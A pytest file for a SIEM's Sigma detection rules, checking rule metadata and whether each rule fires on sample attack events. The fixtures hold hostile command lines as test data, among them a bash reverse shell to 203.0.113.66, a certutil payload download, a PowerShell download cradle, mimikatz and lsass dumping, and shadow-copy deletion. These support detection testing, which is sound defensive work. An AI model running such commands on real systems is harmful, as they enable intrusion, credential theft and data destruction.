"""
Tests for ENH-027 -- detection content quality.

`config/mitre_enterprise_complete.py` seeds 286 MITRE techniques, but
`packages/rules/` contains only four hand-written rules, and none of them had a
single test. Coverage breadth without validated quality produces alert fatigue,
which is how customers end up ignoring a SIEM.

This establishes the floor a content programme needs:

* every shipped rule is structurally valid and evaluable,
* every rule carries the metadata analysts triage with (severity, MITRE
  technique, documented false positives),
* every rule is exercised against a POSITIVE sample it must match and a
  NEGATIVE sample it must not.

The positive/negative samples live here rather than beside the rules because
`packages/rules/` is consumed as content by deployments; the fixtures are our
test assets. Moving them to per-rule fixture files is the natural next step.
"""

import glob
import re
from pathlib import Path

import pytest

yaml = pytest.importorskip("yaml")

from sigma_condition import parse_condition  # noqa: E402
from sigma_engine import CountCondition, SigmaConditionEvaluator  # noqa: E402

RULES_DIR = Path(__file__).resolve().parent.parent / "packages" / "rules"
RULE_FILES = [
    f for f in sorted(glob.glob(str(RULES_DIR / "*.yml")))
    # ENH-039: content_pack.yml is a MULTI-rule document with a
    # different schema; covered by tests/test_content_pack.py.
    if not f.endswith("content_pack.yml")
]


def _load(path):
    return yaml.safe_load(Path(path).read_text(encoding="utf-8"))


def _rule_id(path):
    return Path(path).stem


assert RULE_FILES, "No rules found in packages/rules/"


# ---------------------------------------------------------------------------
# Structural validity
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_is_valid_yaml(path):
    assert isinstance(_load(path), dict)


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_has_required_sigma_fields(path):
    rule = _load(path)
    for field in ("title", "id", "description", "detection", "level"):
        assert field in rule, f"Rule is missing required field '{field}'"


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_ids_are_unique(path):
    ids = [_load(p)["id"] for p in RULE_FILES]
    assert len(ids) == len(set(ids)), f"Duplicate rule ids: {ids}"


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_level_is_recognised(path):
    """An unrecognised level cannot be mapped to a severity for triage."""
    assert _load(path)["level"] in {"informational", "low", "medium", "high", "critical"}


# ---------------------------------------------------------------------------
# Evaluability -- a rule that cannot be evaluated is dead content
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_condition_is_evaluable(path):
    """
    Either a parseable boolean condition or a recognised count condition.
    Anything else silently never fires -- which is how
    `brute_force_detection.yml` came to be dead (ENH-036).
    """
    rule = _load(path)
    detection = rule["detection"]
    condition = detection.get("condition")

    assert condition, "Rule has no condition"

    if CountCondition.parse(condition) is not None:
        return

    selections = [k for k in detection if k not in ("condition", "timeframe")]
    ast = parse_condition(condition)
    unknown = [n for n in ast.identifiers() if n not in selections]

    assert not unknown, f"Condition references undefined selections: {unknown}"


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_defines_at_least_one_selection(path):
    detection = _load(path)["detection"]
    selections = [k for k in detection if k not in ("condition", "timeframe")]
    assert selections, "Rule defines no selection criteria"


# ---------------------------------------------------------------------------
# Triage metadata -- what an analyst needs at 3am
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_declares_a_mitre_technique(path):
    """
    Without an ATT&CK technique a detection cannot be placed on the coverage
    map, and coverage is how buyers evaluate a SIEM.
    """
    tags = _load(path).get("tags", []) or []
    techniques = [t for t in tags if re.match(r"^attack\.t\d{4}", str(t).lower())]

    assert techniques, f"Rule declares no attack.tXXXX tag. Tags: {tags}"


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_documents_false_positives(path):
    """
    An undocumented false positive is one an analyst has to rediscover under
    pressure. This is the single cheapest defence against alert fatigue.
    """
    fps = _load(path).get("falsepositives", []) or []

    assert fps, "Rule documents no known false positives"
    assert not any(str(f).strip().lower() in {"none", "unknown"} for f in fps), (
        "'None'/'Unknown' is not a useful false-positive note"
    )


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_cites_a_reference(path):
    refs = _load(path).get("references", []) or []
    assert refs, "Rule cites no references"


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_declares_a_logsource(path):
    """Without a logsource it is unclear what data the rule expects."""
    assert _load(path).get("logsource"), "Rule declares no logsource"


# ---------------------------------------------------------------------------
# Behavioural fixtures: does the rule actually match what it claims?
# ---------------------------------------------------------------------------

# (selection name, event that SHOULD match, event that should NOT match)
RULE_FIXTURES = {
    "suspicious_powershell": (
        "selection_cmdline",
        {"command_line": "powershell -enc IEX(New-Object Net.WebClient).downloadstring('http://x')"},
        {"command_line": "powershell Get-ChildItem C:\\Users"},
    ),
    "privilege_escalation": (
        # selection_sudo was removed: every routine sudo alerted (Phase 1).
        "selection_setuid",
        {"syscall": "setuid", "success": "yes"},
        {"event_type": "sudo", "result": "success"},
    ),
    "command_and_control_ingress_tool_transfer": (
        "selection_certutil",
        {"command_line": "certutil.exe -urlcache -split -f http://203.0.113.66/p.exe p.exe"},
        {"command_line": "certutil.exe -hashfile setup.exe SHA256"},
    ),
    "execution_unix_reverse_shell": (
        "selection",
        {"command_line": "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1"},
        {"command_line": "bash /opt/app/healthcheck.sh"},
    ),
    "execution_remote_service": (
        "selection_psexesvc",
        {"process_name": "C:\\Windows\\PSEXESVC.exe"},
        {"process_name": "C:\\Windows\\System32\\services.exe"},
    ),
    "data_exfiltration": (
        "selection_suspicious_protocols",
        {"protocol": "ftp", "bytes_out": "200000"},
        {"protocol": "https", "bytes_out": "200000"},
    ),
    "brute_force_detection": (
        "selection",
        {"event_type": "authentication", "result": "failed"},
        {"event_type": "authentication", "result": "success"},
    ),
    "credential_dumping_lsass": (
        "selection_known_tools",
        {"process_name": "mimikatz.exe", "command_line": "mimikatz sekurlsa::logonpasswords"},
        {"process_name": "explorer.exe", "command_line": "C:\\Windows\\explorer.exe"},
    ),
    "defense_evasion_log_clearing": (
        "selection_wevtutil",
        {"command_line": "wevtutil cl Security"},
        {"command_line": "wevtutil qe Security /c:10"},
    ),
    "persistence_scheduled_task": (
        "selection_schtasks_payload",
        {"command_line": "schtasks /create /tn Updater /tr powershell.exe -enc AAA"},
        {"command_line": "notepad.exe readme.txt"},
    ),
    "lateral_movement_remote_exec": (
        "selection_psexec",
        {"process_name": "psexec.exe", "command_line": "psexec \\\\host cmd"},
        {"process_name": "explorer.exe", "command_line": "explorer.exe"},
    ),
    "impact_ransomware_shadow_copy": (
        "selection_vssadmin",
        {"command_line": "vssadmin delete shadows /all /quiet"},
        {"command_line": "vssadmin list shadows"},
    ),
    "discovery_recon_commands": (
        "selection_domain_enum",
        {"command_line": "net group \"domain admins\" /domain"},
        {"command_line": "net user localaccount"},
    ),
}

# Whole-rule fixtures: evaluated through the full `condition`, including
# filters. A per-selection fixture cannot catch a rule whose FILTER is wrong --
# which is exactly the class of bug ENH-015 fixed in the engine.
RULE_LEVEL_FIXTURES = {
    "persistence_scheduled_task": {
        "should_fire": [
            {"command_line": "schtasks /create /tn Updater /tr powershell -enc AAA"},
            {"command_line": "crontab -e"},
        ],
        "should_not_fire": [
            # Excluded by `filter_benign`: querying tasks is routine admin.
            {"command_line": "schtasks /query /tn MyTask"},
            {"command_line": "crontab -l"},
            {"command_line": "notepad.exe"},
        ],
    },
    "impact_ransomware_shadow_copy": {
        "should_fire": [
            {"command_line": "vssadmin delete shadows /all /quiet"},
            {"command_line": "wmic shadowcopy delete"},
            {"command_line": "bcdedit /set recoveryenabled no"},
        ],
        "should_not_fire": [
            {"command_line": "vssadmin list shadows"},
            {"command_line": "bcdedit /enum"},
        ],
    },
    "defense_evasion_log_clearing": {
        "should_fire": [
            {"command_line": "wevtutil cl Security"},
            {"command_line": "Clear-EventLog -LogName Security"},
            {"event_id": 1102},
        ],
        "should_not_fire": [
            {"command_line": "wevtutil qe Security"},
            {"event_id": 4624},
        ],
    },
    "credential_dumping_lsass": {
        "should_fire": [
            {"process_name": "procdump64.exe", "command_line": "procdump -ma lsass.exe out.dmp"},
            {"command_line": "rundll32 comsvcs.dll MiniDump"},
        ],
        "should_not_fire": [
            # ProcDump on a NON-lsass process must not fire: the rule requires
            # both the tool and the target.
            {"process_name": "procdump64.exe", "command_line": "procdump -ma notepad.exe"},
            {"process_name": "explorer.exe", "command_line": "explorer.exe"},
        ],
    },
}


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_has_behavioural_fixtures(path):
    """
    Every shipped rule must have a positive and a negative sample. A rule with
    no fixtures has never been shown to detect anything.
    """
    assert _rule_id(path) in RULE_FIXTURES, (
        f"No positive/negative fixtures defined for {_rule_id(path)}. "
        "Add them to RULE_FIXTURES."
    )


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_matches_its_positive_sample(path):
    """The true-positive floor: the rule fires on what it was written to catch."""
    rule_id = _rule_id(path)
    selection_name, positive, _ = RULE_FIXTURES[rule_id]

    selection = _load(path)["detection"][selection_name]
    matched, _fields = SigmaConditionEvaluator().evaluate_selection(
        positive, selection
    )

    assert matched is True, (
        f"{rule_id}/{selection_name} did not match its positive sample "
        f"{positive} -- the rule would miss the activity it targets."
    )


@pytest.mark.parametrize("path", RULE_FILES, ids=_rule_id)
def test_rule_does_not_match_its_negative_sample(path):
    """The false-positive floor: benign activity must not fire the rule."""
    rule_id = _rule_id(path)
    selection_name, _, negative = RULE_FIXTURES[rule_id]

    selection = _load(path)["detection"][selection_name]
    matched, _fields = SigmaConditionEvaluator().evaluate_selection(
        negative, selection
    )

    assert matched is False, (
        f"{rule_id}/{selection_name} matched its negative sample {negative} -- "
        "this rule would generate false positives."
    )


# ---------------------------------------------------------------------------
# Coverage reporting
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Whole-rule evaluation, through the real condition
# ---------------------------------------------------------------------------


def _evaluate_rule(rule, log_entry):
    """Evaluate a rule end-to-end: all selections, then its condition."""
    from sigma_condition import evaluate_condition

    detection = rule["detection"]
    condition = detection.get("condition", "selection")

    selection_results = {}
    evaluator = SigmaConditionEvaluator()
    for name, block in detection.items():
        if name in ("condition", "timeframe"):
            continue
        matched, _ = evaluator.evaluate_selection(log_entry, block)
        selection_results[name] = matched

    return evaluate_condition(condition, selection_results)


@pytest.mark.parametrize("rule_id", sorted(RULE_LEVEL_FIXTURES))
def test_rule_fires_on_true_positive_events(rule_id):
    rule = _load(RULES_DIR / f"{rule_id}.yml")

    for event in RULE_LEVEL_FIXTURES[rule_id]["should_fire"]:
        assert _evaluate_rule(rule, event) is True, (
            f"{rule_id} failed to fire on {event} -- it would miss the activity "
            "it was written to catch."
        )


@pytest.mark.parametrize("rule_id", sorted(RULE_LEVEL_FIXTURES))
def test_rule_stays_silent_on_benign_events(rule_id):
    """
    Evaluated through the FULL condition, so a wrong `not filter` is caught.
    A per-selection fixture cannot detect that class of bug.
    """
    rule = _load(RULES_DIR / f"{rule_id}.yml")

    for event in RULE_LEVEL_FIXTURES[rule_id]["should_not_fire"]:
        assert _evaluate_rule(rule, event) is False, (
            f"{rule_id} fired on benign event {event} -- this is an alert-fatigue "
            "generator."
        )


def test_curated_rules_do_not_fire_on_a_benign_logon():
    """
    The regression that matters most for content quality.

    The 286 AUTO-GENERATED rules include 92 whose entire detection is
    `event_id in [4688, 4624, 4625, 1]` -- they fire on every ordinary logon and
    on real malware identically, so they carry zero information. Curated rules
    must not behave that way.
    """
    benign = {
        "event_id": 4624,
        "process_name": "explorer.exe",
        "command_line": "C:\\Windows\\explorer.exe",
        "user": "alice",
        "result": "success",
    }

    firing = []
    for path in RULE_FILES:
        rule = _load(path)
        try:
            if CountCondition.parse(rule["detection"].get("condition", "")) is not None:
                continue  # aggregation rules are batch-level, not per-event
            if _evaluate_rule(rule, benign):
                firing.append(_rule_id(path))
        except Exception:
            continue

    assert not firing, (
        f"Curated rules firing on a benign logon: {firing}. "
        "Every such rule is pure alert fatigue."
    )


def test_curated_rules_detect_a_realistic_attack_chain():
    """
    Each stage of a realistic intrusion must be caught by at least one rule.
    Coverage counted in techniques is meaningless if the chain has blind spots.
    """
    chain = {
        "credential access": {
            "process_name": "mimikatz.exe",
            "command_line": "mimikatz sekurlsa::logonpasswords",
        },
        "lateral movement": {
            "process_name": "psexec.exe",
            "command_line": "psexec \\\\FS01 -s cmd",
        },
        "persistence": {
            "command_line": "schtasks /create /tn Updater /tr powershell -enc AAA",
        },
        "defense evasion": {"command_line": "wevtutil cl Security"},
        "impact": {"command_line": "vssadmin delete shadows /all /quiet"},
        "discovery": {"command_line": "net group \"domain admins\" /domain"},
    }

    uncovered = []
    for stage, event in chain.items():
        detected = False
        for path in RULE_FILES:
            rule = _load(path)
            try:
                if CountCondition.parse(rule["detection"].get("condition", "")) is not None:
                    continue
                if _evaluate_rule(rule, event):
                    detected = True
                    break
            except Exception:
                continue
        if not detected:
            uncovered.append(stage)

    assert not uncovered, f"Attack-chain stages with no detection: {uncovered}"


# ---------------------------------------------------------------------------
# Numeric comparison values (found via the fixtures above)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "log_value,rule_value,expected",
    [
        ("200000", ">100000", True),
        ("50000", ">100000", False),
        ("100000", ">100000", False),
        ("100000", ">=100000", True),
        ("50", "<100", True),
        ("150", "<100", False),
        ("100", "<=100", True),
        (2_000_000, ">1000000", True),   # native int
        (500.5, ">100", True),           # float
        ("> 1000", "> 1000", False),     # non-numeric log value cannot satisfy
    ],
)
def test_numeric_comparison_values(log_value, rule_value, expected):
    """
    `packages/rules/data_exfiltration.yml` uses `bytes_out: ">1000000"`. Without
    comparison support that was matched as a LITERAL STRING, so the rule only
    fired if the log contained the text ">1000000" -- i.e. never. Found by the
    positive-sample fixture for that rule.
    """
    from sigma_engine import SigmaFieldMatcher

    assert SigmaFieldMatcher.match_field(log_value, rule_value) is expected


def test_plain_equality_is_unaffected_by_comparison_support():
    """
    The comparison branch returns None for non-comparison values so normal
    matching still runs. If it returned False instead, every plain equality
    match would break.
    """
    from sigma_engine import SigmaFieldMatcher

    assert SigmaFieldMatcher.match_field("ftp", "ftp") is True
    assert SigmaFieldMatcher.match_field("https", "ftp") is False
    assert SigmaFieldMatcher.match_field("success", "success") is True


def test_report_current_attack_coverage():
    """
    Not a pass/fail bar -- it records the honest number so coverage growth is
    visible rather than asserted in marketing copy.
    """
    techniques = set()
    for path in RULE_FILES:
        for tag in _load(path).get("tags", []) or []:
            match = re.match(r"^attack\.(t\d{4}(?:\.\d+)?)$", str(tag).lower())
            if match:
                techniques.add(match.group(1).upper())

    print(
        f"\nShipped rules: {len(RULE_FILES)} | "
        f"distinct ATT&CK techniques: {len(techniques)} | {sorted(techniques)}"
    )

    assert techniques, "No ATT&CK techniques covered by shipped rules"
